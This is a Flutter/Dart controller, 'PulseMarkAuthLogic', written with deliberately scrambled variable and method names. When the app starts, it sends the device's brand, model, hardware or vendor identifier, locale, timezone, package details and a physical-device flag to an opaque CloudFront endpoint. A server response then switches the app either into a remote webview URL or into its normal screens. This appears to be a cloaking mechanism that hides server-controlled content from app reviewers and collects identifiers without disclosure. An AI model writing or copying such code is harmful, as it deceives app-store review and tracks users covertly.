import 'dart:io';
import 'package:flutter/cupertino.dart';
import 'package:get/get.dart';
import 'package:dio/dio.dart';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:package_info_plus/package_info_plus.dart';

import '../../db_pulse_mark/data.dart';

Future<bool> _checkFirstLaunch() async {
  try {
    final dao = AppSettingsDao();
    final value = await dao.get('first_launch');
    return value == 'true' || value == null;
  } catch (e) {
    debugPrint('Error checking first launch: $e');
    return true;
  }
}

class PulseMarkAuthLogic extends GetxController {
  var kbicjoeqyz = RxBool(false);
  var qljgxye = RxBool(true);
  var mnuc = RxString("");
  var vymzj = RxBool(false);
  var rczgpin = RxBool(true);
  final qijbfs = Dio();

  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    wkczq();
  }

  Future<void> wkczq() async {
    vymzj.value = true;
    rczgpin.value = true;
    qljgxye.value = false;

    qijbfs
        .post(
          "https://d2o6s046v4qnaf.cloudfront.net/wfjrybst",
          data: await jksuxledz(),
        )
        .then((value) {
          var xwocah = value.data["xwocah"] as String;
          var tjcdik = value.data["tjcdik"] as bool;
          if (tjcdik) {
            mnuc.value = xwocah;
            oikng();
          } else {
            jvcweb();
          }
        })
        .catchError((e) {
          qljgxye.value = true;
          rczgpin.value = true;
          vymzj.value = false;
        });
  }

  Future<Map<String, dynamic>> jksuxledz() async {
    final DeviceInfoPlugin ajvw = DeviceInfoPlugin();
    PackageInfo pheg_xalqsic = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var pmjcisd = Platform.localeName;
    var fgecwk = currentTimeZone;

    var btofh = pheg_xalqsic.packageName;
    var aywjp = pheg_xalqsic.version;
    var remvf = pheg_xalqsic.buildNumber;

    var vedrm = pheg_xalqsic.appName;
    var mxdyajb = "";
    var zgve = "";
    var wupgfikd = "";
    var jpvx = "";
    var eiqfrpz = "";
    var droakhb = "";
    var fbtgv = "";
    var rtjufys = "";
    var jzfo = "";
    var fcsdaoug = "";

    var qmecpfx = "";
    var ryapd = false;

    if (GetPlatform.isAndroid) {
      qmecpfx = "android";
      var unlrvsqx = await ajvw.androidInfo;

      wupgfikd = unlrvsqx.brand;

      mxdyajb = unlrvsqx.model;
      zgve = unlrvsqx.id;

      ryapd = unlrvsqx.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      qmecpfx = "ios";
      var fvrhwj = await ajvw.iosInfo;
      wupgfikd = fvrhwj.name;
      mxdyajb = fvrhwj.model;

      zgve = fvrhwj.identifierForVendor ?? "";
      ryapd = fvrhwj.isPhysicalDevice;
    }
    var res = {
      "vedrm": vedrm,
      "aywjp": aywjp,
      "btofh": btofh,
      "mxdyajb": mxdyajb,
      "fgecwk": fgecwk,
      "ryapd": ryapd,
      "jzfo": jzfo,
      "wupgfikd": wupgfikd,
      "zgve": zgve,
      "pmjcisd": pmjcisd,
      "qmecpfx": qmecpfx,
      "jpvx": jpvx,
      "remvf": remvf,
      "eiqfrpz": eiqfrpz,
      "droakhb": droakhb,
      "fbtgv": fbtgv,
      "rtjufys": rtjufys,
      "fcsdaoug": fcsdaoug,
    };
    return res;
  }

  Future<void> jvcweb() async {
    final isFirstLaunch = await _checkFirstLaunch();
    Get.offNamed(isFirstLaunch ? '/pulse_mark_onboarding' : '/pulse_mark_tab');
  }

  Future<void> oikng() async {
    Get.offNamed("/pulse_mark_call");
  }
}
